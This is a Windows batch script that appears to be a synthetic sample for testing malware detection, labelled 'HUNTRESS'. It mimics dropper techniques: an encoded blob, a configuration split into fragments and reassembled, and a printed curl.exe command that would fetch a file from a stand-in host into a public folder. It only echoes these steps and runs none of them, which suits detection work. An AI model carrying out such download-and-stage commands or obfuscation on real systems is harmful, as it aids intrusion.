@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:split_fragments|rotate_left

rem HUNTRESS-MATERIAL:7Hpi+OboyuDmesLG4urS5Mq+5Mra3ujKWO7k0ujKvszS2Mr4wsjC4OjK5HrG6uTYXMrwyvjm6MLOyr7G3urc6Hpi+M7kwuDQeszC2NjEwsbWvuTK6OTy+NzK8Oi+2MLczurCzsp63N7cyvjGwtrgwtLO3L7SyHrGwtrgwtLO3FpuYsjGym5ybMxi+Ork2HrQ6Ojg5nReXm5iyMbKbnJszGJcyvDC2uDYylzS3OzC2NLIXm7KasZucnDKXMjC6PjM0tjKvuDC6NB6hnS4qubK5Oa4oOrE2NLGuJDq3OjkyubmmMLEuObows7KWm5iyMbKbnJszGJcyMLo

rem HUNTRESS-EXTENSION:bat

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set fragment0=v=1^|steps=acquire_remote,write_file^|adapter=curl.exe^|stage_coun
set fragment1=t=1^|graph=fallback_retry^|next_language=none^|campaign_id=campaig
set fragment2=n-71dce796f1^|url=https://71dce796f1.example.invalid/7e5c798e.da
set fragment3=t^|file_path=C:\Users\Public\HuntressLab\stage-71dce796f1.dat

goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_dead_label=a06bdefc"

for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
exit /b 0
:HUNTRESS_EMIT

echo(!recovered_configuration!

exit /b 0

:HUNTRESS_PLAN

echo curl.exe acquire https://71dce796f1.example.invalid/7e5c798e.dat to C:\Users\Public\HuntressLab\stage-71dce796f1.dat

exit /b 0

